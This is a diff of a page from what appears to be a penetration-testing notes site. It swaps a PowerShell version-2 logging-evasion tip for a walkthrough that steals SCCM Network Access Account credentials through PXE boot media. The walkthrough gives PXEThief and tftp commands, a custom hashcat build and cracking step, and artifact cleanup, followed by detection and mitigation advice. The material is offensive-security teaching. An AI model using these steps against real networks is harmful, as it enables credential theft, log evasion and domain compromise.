@@ -8,13 +8,13 @@
       
       
       
-        <link rel="canonical" href="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Powershell%20Downgrade/">
+        <link rel="canonical" href="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Pre-Boot%20Execution%20Environment%20PXE/">
       
       
-        <link rel="prev" href="../Enumerating%20Security%20Controls/">
+        <link rel="prev" href="../PetitPotam%20%28MS-EFSRPC%29/">
       
       
-        <link rel="next" href="../../Discovery%20%26%20Reconnaissance/Domain%20User%20Enumeration/">
+        <link rel="next" href="../Word%20Doc%20Macro/">
       
       
       <link rel="icon" href="../../../assets/favicon.ico">
@@ -22,7 +22,7 @@
     
     
       
-        <title>Powershell Downgrade - jacobh.io</title>
+        <title>Pre Boot Execution Environment PXE - jacobh.io</title>
       
     
     
@@ -57,11 +57,11 @@
       
         <meta  property="og:type"  content="website" >
       
-        <meta  property="og:title"  content="Powershell Downgrade - jacobh.io" >
+        <meta  property="og:title"  content="Pre Boot Execution Environment PXE - jacobh.io" >
       
         <meta  property="og:description"  content="None" >
       
-        <meta  property="og:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/Defense Evasion/Powershell Downgrade.png" >
+        <meta  property="og:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/Initial Access & Delivery/Pre-Boot Execution Environment PXE.png" >
       
         <meta  property="og:image:type"  content="image/png" >
       
@@ -69,15 +69,15 @@
       
         <meta  property="og:image:height"  content="630" >
       
-        <meta  property="og:url"  content="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Powershell%20Downgrade/" >
+        <meta  property="og:url"  content="https://jacobh.io/%F0%9F%AA%9F%20Active%20Directory/Initial%20Access%20%26%20Delivery/Pre-Boot%20Execution%20Environment%20PXE/" >
       
         <meta  name="twitter:card"  content="summary_large_image" >
       
-        <meta  name="twitter:title"  content="Powershell Downgrade - jacobh.io" >
+        <meta  name="twitter:title"  content="Pre Boot Execution Environment PXE - jacobh.io" >
       
         <meta  name="twitter:description"  content="None" >
       
-        <meta  name="twitter:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/Defense Evasion/Powershell Downgrade.png" >
+        <meta  name="twitter:image"  content="https://jacobh.io/assets/images/social/🪟 Active Directory/Initial Access & Delivery/Pre-Boot Execution Environment PXE.png" >
       
     
     
@@ -98,6 +98,11 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
+      
+        
+        <a href="#technique" class="md-skip">
+          Skip to content
+        </a>
       
     </div>
     <div data-md-component="announce">
@@ -128,7 +133,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Powershell Downgrade
+              Pre Boot Execution Environment PXE
             
           </span>
         </div>
@@ -3600,8 +3605,6 @@
                 
   
   
-    
-  
   
   
     
@@ -3612,11 +3615,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_4" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_4" >
         
           
           <label class="md-nav__link" for="__nav_7_4" id="__nav_7_4_label" tabindex="0">
@@ -3632,7 +3635,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_4_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_4_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_7_4">
             <span class="md-nav__icon md-icon"></span>
             Defense Evasion
@@ -3646,7 +3649,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../Enumerating%20Security%20Controls/" class="md-nav__link">
+      <a href="../../Defense%20Evasion/Enumerating%20Security%20Controls/" class="md-nav__link">
         
   
   
@@ -3666,17 +3669,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../../Defense%20Evasion/Powershell%20Downgrade/" class="md-nav__link">
         
   
   
@@ -3687,7 +3683,6 @@
   
 
       </a>
-      
     </li>
   
 
@@ -3915,6 +3910,8 @@
                 
   
   
+    
+  
   
   
     
@@ -3925,11 +3922,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_6" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_6" checked>
         
           
           <label class="md-nav__link" for="__nav_7_6" id="__nav_7_6_label" tabindex="0">
@@ -3945,7 +3942,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_6_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_7_6_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_7_6">
             <span class="md-nav__icon md-icon"></span>
             Initial Access & Delivery
@@ -3959,7 +3956,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/GPP%20Password/" class="md-nav__link">
+      <a href="../GPP%20Password/" class="md-nav__link">
         
   
   
@@ -3982,7 +3979,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/IPv6%20Attacks/" class="md-nav__link">
+      <a href="../IPv6%20Attacks/" class="md-nav__link">
         
   
   
@@ -4005,7 +4002,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/LLMNR%20Poisoning/" class="md-nav__link">
+      <a href="../LLMNR%20Poisoning/" class="md-nav__link">
         
   
   
@@ -4028,7 +4025,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/LNK%20File%20Attacks/" class="md-nav__link">
+      <a href="../LNK%20File%20Attacks/" class="md-nav__link">
         
   
   
@@ -4051,7 +4048,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/NetNTLM%20Hash%20Stealing%20Locations/" class="md-nav__link">
+      <a href="../NetNTLM%20Hash%20Stealing%20Locations/" class="md-nav__link">
         
   
   
@@ -4074,7 +4071,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/Password%20Stuff/" class="md-nav__link">
+      <a href="../Password%20Stuff/" class="md-nav__link">
         
   
   
@@ -4097,7 +4094,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/PetitPotam%20%28MS-EFSRPC%29/" class="md-nav__link">
+      <a href="../PetitPotam%20%28MS-EFSRPC%29/" class="md-nav__link">
         
   
   
@@ -4117,10 +4114,30 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/Pre-Boot%20Execution%20Environment%20PXE/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Pre Boot Execution Environment PXE
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -4131,6 +4148,111 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#technique" class="md-nav__link">
+    <span class="md-ellipsis">
+      Technique
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prerequisites
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Considerations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#identify" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identify
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execution
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cleanup-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cleanup Considerations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection &amp; Mitigation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection &amp; Mitigation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -4143,7 +4265,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/Word%20Doc%20Macro/" class="md-nav__link">
+      <a href="../Word%20Doc%20Macro/" class="md-nav__link">
         
   
   
@@ -4166,7 +4288,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../Initial%20Access%20%26%20Delivery/ZeroLogon/" class="md-nav__link">
+      <a href="../ZeroLogon/" class="md-nav__link">
         
   
   
@@ -4960,6 +5082,101 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#technique" class="md-nav__link">
+    <span class="md-ellipsis">
+      Technique
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prerequisites
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Considerations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#identify" class="md-nav__link">
+    <span class="md-ellipsis">
+      Identify
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Execution
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cleanup-considerations" class="md-nav__link">
+    <span class="md-ellipsis">
+      Cleanup Considerations
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection &amp; Mitigation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Detection &amp; Mitigation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#detection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Detection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#mitigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Mitigation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -4977,11 +5194,137 @@
   
 
 
-  <h1>Powershell Downgrade</h1>
+  <h1>Pre Boot Execution Environment PXE</h1>
 
-<p>Powershell event logging was introduced as a feature with Powershell 3.0 and forward. We can attempt to enable <strong>Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer.</strong>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-version</span> <span class="n">2</span>
-</span></code></pre></div></p>
+<h2 id="technique">Technique</h2>
+<hr />
+<p>This technique provides initial access by exploiting the <strong>Pre-Boot Execution Environment (PXE)</strong>, a standard for booting computers over the network. In corporate environments, PXE is commonly used by <strong>System Center Configuration Manager (SCCM)</strong> to deploy operating systems.</p>
+<p>An attacker on the local network can masquerade as a new computer requesting a boot image. By capturing the SCCM boot media files, the attacker can perform an offline password cracking attack to decrypt them. A successful decryption reveals sensitive information, most notably the credentials for the <strong>Network Access Account (NAA)</strong> or domain join accounts, which can be used for initial access and privilege escalation within the Active Directory domain.</p>
+<div class="admonition alert">
+<p class="admonition-title">note</p>
+<p>The presence of PXE is a common indicator that SCCM is being used as well, but not always</p>
+</div>
+<h2 id="prerequisites">Prerequisites</h2>
+<hr />
+<p><strong>Access Level:</strong> An attacker needs to be on the same local network (broadcast domain) as the SCCM PXE-enabled Distribution Point. No prior domain credentials are required.</p>
+<p><strong>System State:</strong></p>
+<ul>
+<li>
+<p>A PXE-enabled SCCM Distribution Point must be accessible on the network.</p>
+</li>
+<li>
+<p>The attacker's machine must be a Windows system to run the required tool, <code>PXEThief</code>.</p>
+</li>
+<li>
+<p>The attacker's machine must be seen as an "Unknown Computer" by SCCM.</p>
+</li>
+<li>
+<p>A <code>tftp</code> client is required to download boot files.</p>
+</li>
+<li>
+<p><code>hashcat</code> and a custom SCCM hashcat module are needed for password cracking.</p>
+</li>
+</ul>
+<p><strong>Information:</strong> The IP address of the SCCM Distribution Point (DP) is helpful, though it can sometimes be discovered.</p>
+<h2 id="considerations">Considerations</h2>
+<hr />
+<p><strong>Impact</strong></p>
+<p>A successful attack grants the attacker highly valuable credentials. The <strong>Network Access Account</strong> and <strong>Domain Join Account</strong> often have permissions to read from most Active Directory objects and write to computer objects, providing a significant foothold for lateral movement and further exploitation.</p>
+<p><strong>OPSEC</strong></p>
+<ul>
+<li>
+<p>Initial PXE/DHCP requests are broadcast traffic and may not appear suspicious.</p>
+</li>
+<li>
+<p>The <code>tftp</code> file transfer is unencrypted and could be flagged by network monitoring.</p>
+</li>
+<li>
+<p>Subsequent authenticated requests to the SCCM Management Point (MP) originate from an attacker-controlled, unmanaged device, which could be an indicator of compromise if client origins are monitored.</p>
+</li>
+</ul>
+<h2 id="identify">Identify</h2>
+<hr />
+<p>The primary method for identifying a vulnerable PXE server is to use the <code>PXEThief</code> tool. While it has a discovery option, directly targeting a known or suspected SCCM server IP address is more reliable.
+<a href="https://github.com/MWR-CyberSec/PXEThief">https://github.com/MWR-CyberSec/PXEThief</a></p>
+<div class="admonition alert">
+<p class="admonition-title">note</p>
+<p>PXEThief  should only be used on windows do to the pywin32 dependency, it also works best with python 3.10 </p>
+</div>
+<p><div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="n">python</span> <span class="n">pxethief</span><span class="p">.</span><span class="n">py</span> <span class="n">2</span> <span class="p">&lt;</span><span class="n">DISTRIBUTION_POINT_IP</span><span class="p">&gt;</span>
+</span></code></pre></div>
+A successful response will provide the file paths for the .boot.var and .boot.bcd files on the server's TFTP share.</p>
+<h2 id="execution">Execution</h2>
+<hr />
+<p><strong>Step 1: Request Boot Media Paths</strong></p>
+<p>Use PXEThief to coerce the DP into providing the location of the encrypted boot media files.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">python</span> <span class="n">pxethief</span><span class="p">.</span><span class="n">py</span> <span class="n">2</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p>This will output the full paths to the <code>.boot.var</code> and <code>.boot.bcd</code> files.</p>
+<p><strong>Step 2: Download the Encrypted Boot Variable File</strong></p>
+<p>Use the <code>tftp</code> client to download the <code>.boot.var</code> file from the Distribution Point.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">tftp</span> <span class="n">-i</span> <span class="p">&lt;</span><span class="n">DISTRIBUTION_POINT_IP</span><span class="p">&gt;</span> <span class="n">GET</span> <span class="s2">&quot;\\SMSTemp\\&lt;...&gt;.boot.var&quot;</span> <span class="s2">&quot;&lt;...&gt;.boot.var&quot;</span>
+</span></code></pre></div>
+<p><strong>Step 3: Extract the Hash for Cracking</strong></p>
+<p>Use <code>PXEThief</code> with option 5 to process the downloaded <code>.boot.var</code> file and generate a crackable hash.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">python</span> <span class="n">pxethief</span><span class="p">.</span><span class="n">py</span> <span class="n">5</span> <span class="s1">&#39;.\\&lt;...&gt;.boot.var&#39;</span>
+</span></code></pre></div>
+<p>A specific <a href="https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module">hashcat module</a> must be used to crack the hash. Here is how to install it:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nb">cd</span><span class="w"> </span>hashcat_pxe/
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/hashcat/hashcat.git
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>cp<span class="w"> </span>configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c<span class="w"> </span>hashcat/src/modules/
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>cp<span class="w"> </span>configmgr-cryptderivekey-hashcat-module/opencl_code/m19850<span class="se">\*</span><span class="w"> </span>hashcat/OpenCL/
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="nb">cd</span><span class="w"> </span>hashcat
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>git<span class="w"> </span>checkout<span class="w"> </span>-b<span class="w"> </span>v6.2.5<span class="w"> </span>tags/v6.2.5<span class="w"> </span><span class="c1"># change to 6.2.5</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>make
+</span></code></pre></div>
+<p>Then, the hash can be cracked with hashcat's module <code>19850</code> and a password wordlist:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>hashcat/hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">19850</span><span class="w"> </span>--force<span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>hashcat/hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span></code></pre></div>
+<p><strong>Step 5: Decrypt Media and Extract Credentials</strong></p>
+<p>Use <code>PXEThief</code> with option 3, providing the downloaded <code>.boot.var</code> file and the cracked password to decrypt the contents and automatically extract credentials.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">python</span> <span class="n">pxethief</span><span class="p">.</span><span class="n">py</span> <span class="n">3</span> <span class="s1">&#39;.\\&lt;...&gt;.boot.var&#39;</span> <span class="s2">&quot;Password123!&quot;</span>
+</span></code></pre></div>
+<p>The tool will parse the decrypted data and display any found usernames and passwords for accounts like the NAA.</p>
+<h2 id="cleanup-considerations">Cleanup Considerations</h2>
+<hr />
+<ul>
+<li>
+<p>Delete all downloaded artifacts from the attack machine, including the <code>.boot.var</code>, <code>.boot.bcd</code>, <code>variables.xml</code>, and the exported <code>.pfx</code> certificate file.</p>
+</li>
+<li>
+<p>Remove the client certificate imported by <code>PXEThief</code> from the Windows Certificate Store.</p>
+</li>
+</ul>
+<h2 id="detection-mitigation">Detection &amp; Mitigation</h2>
+<hr />
+<h4 id="detection"><strong>Detection</strong></h4>
+<ul>
+<li>
+<p><strong>Network Monitoring:</strong> Monitor for unusual <code>tftp</code> traffic or a high volume of PXE boot requests from a single source.</p>
+</li>
+<li>
+<p><strong>Log Analysis:</strong> Audit SCCM and domain controller logs for authentication events tied to the Network Access Account originating from unexpected or unmanaged IP addresses.</p>
+</li>
+<li>
+<p><strong>Endpoint Monitoring:</strong> Look for the execution of <code>PXEThief.py</code> or <code>tftp.exe</code> on non-administrative workstations.</p>
+</li>
+</ul>
+<h4 id="mitigation"><strong>Mitigation</strong></h4>
+<ul>
+<li>
+<p><strong>Strong Passwords:</strong> Protect the PXE boot media with a <strong>strong, complex, and long password</strong>. This makes offline cracking significantly more difficult and time-consuming.</p>
+</li>
+<li>
+<p><strong>Least Privilege:</strong> Strictly enforce the principle of least privilege for the Network Access Account and any domain join accounts. They should have the absolute minimum permissions required to function.</p>
+</li>
+<li>
+<p><strong>Network Segmentation:</strong> Use VLANs and firewall rules to restrict which network segments can communicate with SCCM Distribution Points on required ports (e.g., DHCP, TFTP).</p>
+</li>
+<li>
+<p><strong>Regular Audits:</strong> Regularly audit and rotate the credentials used for PXE boot and within Task Sequences.</p>
+</li>
+</ul>
 
 
 
